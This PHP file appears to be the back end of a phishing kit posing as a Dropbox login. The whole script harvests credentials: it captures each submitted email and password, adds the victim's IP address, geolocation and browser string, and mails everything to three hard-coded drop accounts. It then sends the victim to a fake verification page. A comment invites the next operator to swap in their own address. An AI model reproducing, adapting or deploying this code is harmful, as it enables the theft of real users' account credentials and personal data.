<?php
if($_POST["Email"] != "" and $_POST["Password"] != ""){
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}
$adddate=date("D M d, Y g:i a");
$browser = $_SERVER['HTTP_USER_AGENT']; 
$message .= "|----------| E M A I L  |--------------|\n";
$message .= "|eMail : ".$_POST['Email']."\n";
$message .= "|PasSword : ".$_POST['Password']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "Date: ".$adddate."\n";
$message .= "User Agent: ".$browser."\n";
$message .= 'View ['.$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"].']';
//change ur email here
$sent ="result202box@gmail.com,result305box@hotmail.com,resultbox101@rediffmail.com";


$subject = "DropBox Result - " .$ip;
$headers = "From: $ip" . "\r\n" .
    				'X-Mailer: PHP/' . phpversion();
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
if(preg_match("/@gmail\.com$/", urldecode($_POST['Email'])))
    {
	mail($sent,$subject,$message,$headers);header("Location:  verification.html");exit;
    }else{mail($sent,$subject,$message,$headers);}

 
     header("Location: verification.html");
}else{
header("Location: index.php");
}

?>